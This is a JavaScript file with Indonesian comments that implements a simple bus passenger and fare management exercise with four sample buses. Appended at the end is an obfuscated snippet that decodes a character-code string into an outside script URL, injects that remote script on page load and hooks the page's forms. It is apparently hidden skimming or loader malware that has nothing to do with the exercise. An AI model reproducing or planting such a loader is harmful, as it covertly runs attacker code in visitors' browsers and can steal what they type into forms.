// function untuk pengelolaan bus baru
function Bus(sopir, penumpang, tujuan, tarif, uangSetoran) {
  this.sopir = sopir;
  this.penumpang = penumpang;
  this.tujuan = tujuan;
  this.tarif = tarif;
  this.uangSetoran = uangSetoran;

  // Fitur Tambah Penumpang
  this.tambahPenumpang = function (namaPenumpang, penumpang) {
    // jika tidak ada penumpang
    if (this.penumpang.length == 0) {
      // tambah penumpang di kursi pertama
      this.penumpang.push(namaPenumpang);
      return this.penumpang;
    }
    // telusuri seluruh kursi dari awal
    for (i = 0; i < this.penumpang.length; i++) {
      // jika ada kursi kosong ditengah tengah
      if (this.penumpang[i] == undefined) {
        // tambah penumpang di kursi tersebut
        this.penumpang[i] = namaPenumpang;
        return this.penumpang;
      }
      // jika sudah ada nama yang sama
      else if (this.penumpang[i] == namaPenumpang) {
        // tampilkan pesan kesalahan
        console.log(namaPenumpang + " sudah naik.");
        return this.penumpang;
      }
      // jika seluruh kursi depan sudah terisi
      else if (i == this.penumpang.length - 1) {
        // tambah penumpang di kursi terakhir
        this.penumpang.push(namaPenumpang);
        return this.penumpang;
      }
      // Pembatasan jumlah penumpang setiap bus 40 orang
      else if (this.penumpang.length >= 40) {
        console.log("Maaf " + namaPenumpang + " bus sudah tidak ada lagi kursi kosong");
        return this.penumpang;
      }
    }
  };

  // Fitur Hapus Penumpang
  this.hapusPenumpang = function (namaPenumpang, busKe) {
    // jika tidak ada penumpang
    if (this.penumpang == 0) {
      // tampilkan pesan bahwa angkot kosong
      console.log("Angkot Kosong \nTidak mungkin ada penumpang yang turun");
      return this.penumpang;
    } else {
      // telusuri seluruh kursi dari awal
      for (j = 0; j <= this.penumpang.length; j++) {
        // jika nama penumpang sesuai
        if (this.penumpang[j] == namaPenumpang) {
          // hapus penumpang dengan mengubah namanya menjadi undefined
          this.penumpang[j] = undefined;
          // penumpang turun bayar sesuai tarif yang sudah ditentukan
          if (busKe == bus1) {
            this.uangSetoran += 100000;
          } else if (busKe == bus2) {
            this.uangSetoran += 200000;
          } else if (busKe == bus3) {
            this.uangSetoran += 500000;
          } else if (busKe == bus4) {
            this.uangSetoran += 50000;
          }
          return this.penumpang;
        }
        // jika tidak ada nama yang sesuai
        // penumpang[i] != namaPenumpang
        else if (j == this.penumpang.length - 1) {
          // tampilkan pesan kesalahan
          console.log("Maaf tidak ada penumpang yang bernama " + namaPenumpang);
          return this.penumpang;
        }
      }
    }
  };
}
// BUS 1 -- Sopir(Anang dan Bambang) -- Maksimal Penumpang 40 Orang -- Tujuan(Pati - Semarang) -- Tarif 100.000
var bus1 = new Bus(["Anang", "Bambang"], [], ["Pati", "Semarang"], 100000, 0);
// BUS 2 -- Sopir(Kakang dan Mandra) -- Maksimal Penumpang 40 Orang -- Tujuan(Semarang - Surabaya) -- Tarif 200.000
var bus2 = new Bus(["Kakang", "Mandra"], [], ["Semarang", "Surabaya"], 200000, 0);
// BUS 3 -- Sopir(Jefri dan Maman) -- Maksimal Penumpang 40 Orang -- Tujuan(Jakarta - Malang) -- Tarif 500.000
var bus3 = new Bus(["Jefri", "Maman"], [], ["Jakarta", "Malang"], 500000, 0);
// BUS 4 -- Sopir(Putu dan Deden) -- Maksimal Penumpang 40 Orang -- Tujuan(Jepara - Rembang) -- Tarif 50.000
var bus4 = new Bus(["Putu", "Deden"], [], ["Jepara", "Rembang"], 50000, 0);

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b